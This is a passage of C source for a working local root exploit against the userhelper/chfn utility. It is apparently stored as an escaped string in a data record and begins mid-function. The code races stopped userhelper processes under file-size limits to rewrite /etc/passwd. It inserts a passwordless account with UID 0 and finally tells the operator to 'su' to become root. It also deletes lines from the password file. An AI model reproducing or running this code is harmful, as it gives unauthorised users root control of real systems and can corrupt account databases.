size)\n{\n    if (fd <= -1) die();\n    if (data == NULL) die();\n    if (size >= INT_MAX) die();\n \n    char header[1 + UH_REQUEST_SIZE_DIGITS + 1];\n    if (read(fd, header, sizeof(header)-1) != sizeof(header)-1) die();\n    header[sizeof(header)-1] = '\\0';\n \n    errno = 0;\n    char *endptr = NULL;\n    const unsigned long len = strtoul(&header[1], &endptr, 10);\n    if (errno != 0 || endptr != &header[sizeof(header)-1]) die();\n \n    if (len >= size) die();\n    if (read(fd, data, len+1) != (ssize_t)(len+1)) die();\n    if (data[len] != '\\n') die();\n    data[len] = '\\0';\n \n    if (strlen(data) != len) die();\n    if (strchr(data, '\\n') != NULL) die();\n    return header[0];\n}\n \nstatic void\nsend_reply(const int fd, const unsigned char type, const char *const data)\n{\n    if (fd <= -1) die();\n    if (!isascii(type)) die();\n    if (!isprint(type)) die();\n    if (data == NULL) die();\n    if (strpbrk(data, \"\\r\\n\") != NULL) die();\n \n    char buf[BUFSIZ];\n    const int len = xsnprintf(buf, sizeof(buf), \"%c%s\\n\", (int)type, data);\n    if (send(fd, buf, len, MSG_NOSIGNAL) != len) die();\n}\n \n#define ETCDIR \"/etc\"\n#define PASSWD \"/etc/passwd\"\n#define BACKUP \"/etc/passwd-\"\n \nstatic struct {\n    char username[64];\n    char password[64];\n    struct gecos_data gecos;\n} my;\n \nstatic volatile sig_atomic_t is_child_dead;\n \nstatic void\nsigchild_handler(const int signum __attribute__ ((__unused__)))\n{\n    is_child_dead = true;\n}\n \nstatic int\nwait_for_userhelper(struct userhelper *const uh, const int options)\n{\n    if (uh == NULL) die();\n    if (uh->pid <= 0) die();\n    if ((options & ~(WUNTRACED | WCONTINUED)) != 0) die();\n \n    int status;\n    for (;;) {\n        const pid_t pid = waitpid(uh->pid, &status, options);\n        if (pid == uh->pid) break;\n        if (pid > 0) _exit(255);\n \n        if (pid != -1) die();\n        if (errno != EINTR) die();\n    }\n    if (WIFEXITED(status) || WIFSIGNALED(status)) uh->pid = -1;\n    return status;\n}\n \nstatic void\nforkstop_userhelper(struct userhelper *const uh)\n{\n    if (uh == NULL) die();\n    if (uh->pid != 0) die();\n    if (gecos_size(&uh->gecos) > GECOS_LENGTH) die();\n \n    struct rlimit fsize;\n    if (getrlimit(RLIMIT_FSIZE, &fsize) != 0) die();\n    if (uh->fsizelim > fsize.rlim_max) die();\n    if (uh->fsizelim <= 0) die();\n    fsize.rlim_cur = uh->fsizelim;\n \n    cpu_set_t old_cpus;\n    CPU_ZERO(&old_cpus);\n    if (sched_getaffinity(0, sizeof(old_cpus), &old_cpus) != 0) die();\n \n    { const int cpu = sched_getcpu();\n    if (cpu >= CPU_SETSIZE) die();\n    if (cpu < 0) die();\n    cpu_set_t new_cpus;\n    CPU_ZERO(&new_cpus);\n    CPU_SET(cpu, &new_cpus);\n    if (sched_setaffinity(0, sizeof(new_cpus), &new_cpus) != 0) die(); }\n \n    int sv[2];\n    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) die();\n \n    if (is_child_dead) die();\n    static const struct sigaction sigchild_action = {\n        .sa_handler = sigchild_handler, .sa_flags = SA_NOCLDSTOP };\n    if (sigaction(SIGCHLD, &sigchild_action, NULL) != 0) die();\n \n    uh->pid = fork();\n    if (uh->pid <= -1) die();\n \n    if (uh->pid == 0) {\n        die_fn = die_in_child;\n        if (close(sv[1]) != 0) die();\n        if (dup2(sv[0], UH_INFILENO) != UH_INFILENO) die();\n        if (dup2(sv[0], UH_OUTFILENO) != UH_OUTFILENO) die();\n \n        const int devnull_fd = open(\"/dev/null\", O_RDWR);\n        if (dup2(devnull_fd, STDIN_FILENO) != STDIN_FILENO) die();\n        if (dup2(devnull_fd, STDOUT_FILENO) != STDOUT_FILENO) die();\n        if (dup2(devnull_fd, STDERR_FILENO) != STDERR_FILENO) die();\n \n        if (signal(SIGPIPE, SIG_DFL) == SIG_ERR) die();\n        if (signal(SIGXFSZ, SIG_IGN) == SIG_ERR) die();\n        if (setrlimit(RLIMIT_FSIZE, &fsize) != 0) die();\n \n        if (setpriority(PRIO_PROCESS, 0, +19) != 0) die();\n        static const struct sched_param sched_param = { .sched_priority = 0 };\n        (void) sched_setscheduler(0, SCHED_IDLE, &sched_param);\n \n        char *const argv[] = { UH_PATH,\n                               UH_FULLNAME_OPT,    uh->gecos.full_name,\n                               UH_OFFICE_OPT,      uh->gecos.office,\n                               UH_OFFICEPHONE_OPT, uh->gecos.office_phone,\n                               UH_HOMEPHONE_OPT,   uh->gecos.home_phone,\n                               NULL };\n        char *const envp[] = { NULL };\n        execve(UH_PATH, argv, envp);\n        die();\n    }\n    if (die_fn != die_in_parent) die();\n    if (close(sv[0]) != 0) die();\n    uh->fd = sv[1];\n \n    unsigned long expected_responses = 0;\n    for (;;) {\n        char data[BUFSIZ];\n        const char type = read_request(uh->fd, data, sizeof(data));\n        if (type == UH_SYNC_POINT) break;\n \n        switch (type) {\n        case UH_USER:\n            if (strcmp(data, my.username) != 0) die();\n            break;\n        case UH_SERVICE_NAME:\n            if (strcmp(data, \"chfn\") != 0) die();\n            break;\n        case UH_ECHO_ON_PROMPT:\n        case UH_ECHO_OFF_PROMPT:\n            if (++expected_responses == 0) die();\n            break;\n        case UH_EXPECT_RESP:\n            if (strtoul(data, NULL, 10) != expected_responses) die();\n            break;\n        default:\n            break;\n        }\n    }\n    if (expected_responses != 1) die();\n \n    const int lpasswd_fd = xopen(PASSWD, O_RDONLY);\n    const int inotify_fd = inotify_init();\n    if (inotify_fd <= -1) die();\n    if (inotify_add_watch(inotify_fd, PASSWD, IN_CLOSE_NOWRITE |\n          IN_OPEN) <= -1) die();\n    if (inotify_add_watch(inotify_fd, BACKUP, IN_CLOSE_WRITE) <= -1) {\n        if (errno != ENOENT) die();\n        if (inotify_add_watch(inotify_fd, ETCDIR, IN_CREATE) <= -1) die();\n    }\n \n    send_reply(uh->fd, UH_TEXT, my.password);\n    send_reply(uh->fd, UH_SYNC_POINT, \"\");\n    if (close(uh->fd) != 0) die();\n    uh->fd = -1;\n \n    unsigned int state = 0;\n    static const uint32_t transition[] = { IN_CLOSE_WRITE,\n                                           IN_CLOSE_NOWRITE, IN_OPEN, 0 };\n    for (;;) {\n        if (is_child_dead) die();\n        char buffer[10 * (sizeof(struct inotify_event) + NAME_MAX + 1)];\n        const ssize_t _buflen = read(inotify_fd, buffer, sizeof(buffer));\n        if (is_child_dead) die();\n \n        if (_buflen <= 0) die();\n        size_t buflen = _buflen;\n        if (buflen > sizeof(buffer)) die();\n \n        struct inotify_event *ep;\n        for (ep = (struct inotify_event *)(buffer); buflen >= sizeof(*ep);\n             ep = (struct inotify_event *)(ep->name + ep->len)) {\n            buflen -= sizeof(*ep);\n \n            if (ep->len > 0) {\n                if (buflen < ep->len) die();\n                buflen -= ep->len;\n                if ((ep->mask & IN_CREATE) == 0) die();\n                (void) inotify_add_watch(inotify_fd, BACKUP, IN_CLOSE_WRITE);\n                continue;\n            }\n            if (ep->len != 0) die();\n            while ((ep->mask & transition[state]) != 0) {\n                ep->mask &= ~transition[state++];\n                if (transition[state] == 0) goto stop_userhelper;\n            }\n        }\n        if (buflen != 0) die();\n    }\n    stop_userhelper:\n    if (kill(uh->pid, SIGSTOP) != 0) die();\n    if (close(inotify_fd) != 0) die();\n \n    const int status = wait_for_userhelper(uh, WUNTRACED);\n    if (!WIFSTOPPED(status)) die();\n    if (WSTOPSIG(status) != SIGSTOP) die();\n \n    xclose(lpasswd_fd);\n    if (signal(SIGCHLD, SIG_DFL) == SIG_ERR) die();\n    if (sched_setaffinity(0, sizeof(old_cpus), &old_cpus) != 0) die();\n}\n \nstatic void\ncontinue_userhelper(struct userhelper *const uh)\n{\n    if (uh == NULL) die();\n    if (uh->fd != -1) die();\n    if (uh->pid <= 0) die();\n \n    if (kill(uh->pid, SIGCONT) != 0) die();\n \n    { const int status = wait_for_userhelper(uh, WCONTINUED);\n    if (!WIFCONTINUED(status)) die(); }\n \n    { const int status = wait_for_userhelper(uh, 0);\n    if (!WIFEXITED(status)) die();\n    if (WEXITSTATUS(status) !=\n          ((uh->fsizelim == RLIM_INFINITY) ? 0 : ERR_UNK_ERROR)) die(); }\n \n    memset(uh, 0, sizeof(*uh));\n}\n \nstatic void\ncreate_backup_of_passwd_file(void)\n{\n    char backup[] = \"/tmp/passwd-XXXXXX\";\n    const mode_t prev_umask = umask(077);\n    const int ofd = mkstemp(backup);\n    (void) umask(prev_umask);\n    if (ofd <= -1) die();\n \n    printf(\"Creating a backup copy of \\\"%s\\\" named \\\"%s\\\"\\n\", PASSWD, backup);\n    const int ifd = xopen(PASSWD, O_RDONLY);\n    for (;;) {\n        char buf[BUFSIZ];\n        const ssize_t len = read(ifd, buf, sizeof(buf));\n        if (len == 0) break;\n        if (len <= 0) die();\n        if (write(ofd, buf, len) != len) die();\n    }\n    xclose(ifd);\n    if (close(ofd) != 0) die();\n}\n \nstatic void\ndelete_lines_from_passwd_file(void)\n{\n    struct gecos_data gecos;\n    memset(&gecos, 0, sizeof(gecos));\n    xsnprintf(gecos.site_info, sizeof(gecos.site_info),\n                             \"%s\", my.gecos.site_info);\n    const ssize_t fullname_max = GECOS_LENGTH - gecos_size(&gecos);\n    if (fullname_max >= GECOS_LENGTH) die();\n    if (fullname_max <= 0) die();\n \n    char fragment[64];\n    xsnprintf(fragment, sizeof(fragment), \"\\n%s:\", my.username);\n \n    char *contents = NULL;\n    for (;;) {\n        struct stat st;\n        const int fd = xopen(PASSWD, O_RDONLY);\n        if (fstat(fd, &st) != 0) die();\n        if (st.st_size >= INT_MAX) die();\n        if (st.st_size <= 0) die();\n \n        contents = xrealloc(contents, st.st_size + 1);\n        if (read(fd, contents, st.st_size) != st.st_size) die();\n        contents[st.st_size] = '\\0';\n        xclose(fd);\n \n        const char *cp = strstr(contents, fragment);\n        if (cp == NULL) die();\n        cp = strchr(cp + 2, '\\n');\n        if (cp == NULL) die();\n        if (cp[1] == '\\0') break;\n \n        char *const tp = contents + st.st_size-1;\n        *tp = '\\0';\n        if (tp <= cp) die();\n        if (tp - cp > fullname_max) cp = tp - fullname_max;\n        cp = strpbrk(cp, \"\\n:, \");\n        if (cp == NULL) die();\n \n        const ssize_t fullname_len = tp - cp;\n        if (fullname_len >= GECOS_LENGTH) die();\n        if (fullname_len <= 0) die();\n \n        printf(\"Deleting %zd bytes from \\\"%s\\\"\\n\", fullname_len, PASSWD);\n \n        struct userhelper *const uh = &userhelpers[0];\n        memset(uh->gecos.full_name, 'A', fullname_len);\n        uh->fsizelim = st.st_size;\n        forkstop_userhelper(uh);\n        continue_userhelper(uh);\n \n        uh->fsizelim = RLIM_INFINITY;\n        forkstop_userhelper(uh);\n        continue_userhelper(uh);\n    }\n    free(contents);\n}\n \nstatic size_t passwd_fsize;\nstatic int generate_userhelpers(const char *);\n#define IS_USER_LAST \"last user in passwd file?\"\n \nstatic char candidate_users[256];\nstatic char superuser_elect;\n \nint\nmain(void)\n{\n    // msf note: don't backup /etc/passwd to /tmp\n    //create_backup_of_passwd_file();\n \n    { char candidate[] = \"a\";\n    for (; candidate[0] <= 'z'; candidate[0]++) {\n        if (getpwnam(candidate) != NULL) continue;\n        strcat(candidate_users, candidate);\n    } }\n    if (candidate_users[0] == '\\0') die();\n \n    const struct passwd *const pwd = getpwuid(getuid());\n    if ((pwd == NULL) || (pwd->pw_name == NULL)) die();\n    xsnprintf(my.username, sizeof(my.username), \"%s\", pwd->pw_name);\n    gecos_parse(pwd->pw_gecos, &my.gecos);\n \n    if (fputs(\"Please enter your password:\\n\", stdout) == EOF) die();\n    if (fgets(my.password, sizeof(my.password), stdin) == NULL) die();\n    char *const newline = strchr(my.password, '\\n');\n    if (newline == NULL) die();\n    *newline = '\\0';\n \n    { struct userhelper *const uh = &userhelpers[0];\n    uh->fsizelim = RLIM_INFINITY;\n    forkstop_userhelper(uh);\n    continue_userhelper(uh); }\n \n    retry:\n    if (generate_userhelpers(IS_USER_LAST)) {\n        struct userhelper *const uh1 = &userhelpers[1];\n        strcpy(uh1->gecos.full_name, \"\\n\");\n        uh1->fsizelim = passwd_fsize + 1;\n \n        struct userhelper *const uh0 = &userhelpers[0];\n        uh0->fsizelim = passwd_fsize;\n \n        forkstop_userhelper(uh1), forkstop_userhelper(uh0);\n        continue_userhelper(uh1), continue_userhelper(uh0);\n        if (generate_userhelpers(IS_USER_LAST)) die();\n    }\n\n    static const char a[] = \"?::0:0::/:\";\n    printf(\"Attempting to add \\\"%s\\\" to \\\"%s\\\"\\n\", a, PASSWD);\n \n    const int n = generate_userhelpers(a);\n    if (n == -1) {\n        static int retries;\n        if (retries++) die();\n        memset(userhelpers, 0, sizeof(userhelpers));\n        delete_lines_from_passwd_file();\n        goto retry;\n    }\n    if (n <= 0) die();\n    if (n >= GECOS_LENGTH) die();\n    if (superuser_elect == '\\0') die();\n \n    int i;\n    for (i = n; --i >= 0; ) {\n        printf(\"Starting and stopping userhelper #%d\\n\", i);\n        forkstop_userhelper(&userhelpers[i]);\n    }\n    for (i = n; --i >= 0; ) {\n        printf(\"Continuing stopped userhelper #%d\\n\", i);\n        continue_userhelper(&userhelpers[i]);\n    }\n    printf(\"Exploit successful, run \\\"su %c\\\" to become root\\n\",\n        (int)superuser_elect);\n \n    { struct userhelper *const uh = &userhelpers[0];\n    uh->fsizelim = RLIM_INFINITY;\n    uh->gecos = my.gecos;\n    forkstop_userhelper(uh);\n    continue_userhelper(uh); }\n \n    exit(EXIT_SUCCESS);\n}\n \nstatic void\ngenerate_fullname(char *const fullname, const ssize_t fullname_len,\n    const char c)\n{\n    if (fullname == NULL) die();\n    if (fullname_len < 0) die();\n    if (fullname_len >= GECOS_LENGTH) die();\n \n    memset(fullname, 'A', fullname_len);\n \n    if (fullname_len > 0 && strchr(GECOS_BADCHARS, c) == NULL) {\n        if (!isascii((unsigned char)c)) die();\n        if (!isgraph((unsigned char)c)) die();\n        fullname[fullname_len-1] = c;\n    }\n}\n \nstatic size_t siteinfo_len;\nstatic size_t fullname_off;\n \nstatic size_t before_fullname_len;\nstatic char * before_fullname;\n \nstatic size_t after_fullname_len;\nstatic char * after_fullname;\n \nstatic int\ngenerate_userhelper(const char *const a, const int i, char *const contents)\n{\n    if (i < 0) {\n        if (i != -1) die();\n        return 0;\n    }\n    if (a == NULL) die();\n    if ((unsigned int)i >= strlen(a)) die();\n    if (contents == NULL) die();\n \n    const char _c = a[i];\n    const bool is_user_wildcard = (_c == '?');\n    const char c = (is_user_wildcard ? candidate_users[0] : _c);\n    if (c == '\\0') die();\n \n    const size_t target = passwd_fsize-1 + i;\n    const rlim_t fsizelim = (a[i+1] == '\\0') ? RLIM_INFINITY : target+1;\n    if (fsizelim < passwd_fsize) die();\n \n    const size_t contents_len = strlen(contents);\n    if (contents_len < passwd_fsize) die();\n    if (contents_len <= fullname_off) die();\n \n    char *const fullname = contents + fullname_off;\n    if (memcmp(fullname - before_fullname_len,\n         before_fullname, before_fullname_len) != 0) die();\n \n    const char *rest = strchr(fullname, '\\n');\n    if (rest == NULL) die();\n    rest++;\n \n    const ssize_t fullname_len = (rest - fullname) - after_fullname_len;\n    if (fullname_len >= GECOS_LENGTH) die();\n    if (fullname_len < 0) die();\n \n    if (rest[-1] != '\\n') die();\n    generate_fullname(fullname, fullname_len, c);\n    memcpy(fullname + fullname_len, after_fullname, after_fullname_len);\n    if (rest[-1] != '\\n') die();\n \n    if (memcmp(rest - after_fullname_len,\n      after_fullname, after_fullname_len) != 0) die();\n \n    size_t offset;\n    for (offset = fullname_off; offset < contents_len; offset++) {\n \n        const char x = contents[offset];\n        if (x == '\\0') die();\n        if (is_user_wildcard) {\n            if (strchr(candidate_users, x) == NULL) continue;\n            superuser_elect = x;\n        } else {\n            if (x != c) continue;\n        }\n \n        const ssize_t new_fullname_len = fullname_len + (target - offset);\n        if (new_fullname_len < 0) continue; /* gecos_size() > GECOS_LENGTH */\n        if (4 + new_fullname_len + siteinfo_len + 1 > GECOS_LENGTH) continue;\n \n        if (offset < fullname_off + fullname_len) {\n            if (offset != fullname_off + fullname_len-1) die();\n            if (new_fullname_len == 0) continue;\n        }\n        if (offset >= contents_len-1) {\n            if (offset != contents_len-1) die();\n            if (fsizelim != RLIM_INFINITY) continue;\n        }\n \n        { char *const new_contents = xmalloc(contents_len+1 + GECOS_LENGTH);\n \n        memcpy(new_contents, contents, fullname_off);\n        generate_fullname(new_contents + fullname_off, new_fullname_len, c);\n        memcpy(new_contents + fullname_off + new_fullname_len,\n                   contents + fullname_off + fullname_len,\n                   contents_len+1 - (fullname_off + fullname_len));\n \n        if (strlen(new_contents) != contents_len +\n                (new_fullname_len - fullname_len)) die();\n \n        if (fsizelim != RLIM_INFINITY) {\n            if (fsizelim >= strlen(new_contents)) die();\n            if (fsizelim >= contents_len) die();\n            memcpy(new_contents + fsizelim,\n                       contents + fsizelim,\n                       contents_len+1 - fsizelim);\n        }\n \n        const int err = generate_userhelper(a, i-1, new_contents);\n        free(new_contents);\n        if (err < 0) continue; }\n \n        if (i >= GECOS_LENGTH) die();\n        struct userhelper *const uh = &userhelpers[i];\n        memset(uh, 0, sizeof(*uh));\n \n        uh->fsizelim = fsizelim;\n        if (new_fullname_len >= GECOS_LENGTH) die();\n        generate_fullname(uh->gecos.full_name, new_fullname_len, c);\n        return 0;\n    }\n    return -1;\n}\n \nstatic int\ngenerate_userhelpers(const char *const _a)\n{\n    char a[GECOS_LENGTH];\n    if (_a == NULL) die();\n    const int n = xsnprintf(a, sizeof(a), \"\\n%s\\n\", _a);\n    if (n >= GECOS_LENGTH) die();\n    if (n <= 0) die();\n \n    const int fd = xopen(PASSWD, O_RDONLY);\n    struct stat st;\n    if (fstat(fd, &st) != 0) die();\n    if (st.st_size >= 10*1024*1024) die();\n    if (st.st_size <= 0) die();\n    passwd_fsize = st.st_size;\n \n    char *const contents = xmalloc(passwd_fsize + 1);\n    if (read(fd, contents, passwd_fsize) != (ssize_t)passwd_fsize) die();\n    xclose(fd);\n    contents[passwd_fsize] = '\\0';\n    if (strlen(contents) != passwd_fsize) die();\n    if (contents[passwd_fsize-1] != '\\n') die();\n \n    char fragment[64];\n    xsnprintf(fragment, sizeof(fragment), \"\\n%s:\", my.username);\n    const char *line = strstr(contents, fragment);\n    if (line == NULL) die();\n    line++;\n \n    const char *rest = strchr(line, '\\n');\n    if (rest == NULL) die();\n    if (rest <= line) die();\n    rest++;\n \n    if (strcmp(_a, IS_USER_LAST) == 0) {\n        const bool is_user_last = (*rest == '\\0');\n        free(contents);\n        return is_user_last;\n    }\n \n    unsigned int i;\n    const char *field = line;\n \n    for (i = 0; i <= 5; i++) {\n        const char *const field_end = strchr(field, ':');\n        if (field_end == NULL) die();\n        if (field_end >= rest) die();\n        const size_t field_len = field_end - field;\n \n        switch (i) {\n        case 0:\n            if (field_len != strlen(my.username)) die();\n            if (memcmp(field, my.username, field_len) != 0) die();\n            break;\n        case 1:\n            if (*field != 'x') die();\n            break;\n        case 2:\n            if (strtoimax(field, NULL, 10) != getuid()) die();\n            break;\n        case 3:\n            if (strtoimax(field, NULL, 10) != getgid()) die();\n            break;\n        case 4:\n            {\n                char assembled[GECOS_LENGTH];\n                xsnprintf(assembled, sizeof(assembled),\n                            \"%.*s\", (int)field_len, field);\n                if (strlen(assembled) != field_len) die();\n \n                struct gecos_data gecos;\n                memset(&gecos, 0, sizeof(gecos));\n                xsnprintf(gecos.site_info, sizeof(gecos.site_info),\n                                         \"%s\", my.gecos.site_info);\n                if (strcmp(assembled, gecos_assemble(&gecos)) != 0) die();\n            }\n \n            siteinfo_len = strlen(my.gecos.site_info);\n            fullname_off = field - contents;\n \n            before_fullname_len = field - line;\n            before_fullname = xstrndup(line, before_fullname_len);\n \n            after_fullname_len = rest - field;\n            after_fullname = xstrndup(field, after_fullname_len);\n            break;\n \n        case 5:\n            if (*field != '/') die();\n            break;\n        default:\n            die();\n        }\n        field = field_end + 1;\n    }\n \n    const int err = generate_userhelper(a, n-1, contents);\n \n    free(before_fullname), before_fullname = NULL;\n    free(after_fullname), after_fullname = NULL;\n    free(contents);\n \n    return (err < 0) ? -1 : n;\n}\n", "timestamp": "2025-10-24T23:42:10.249742"}
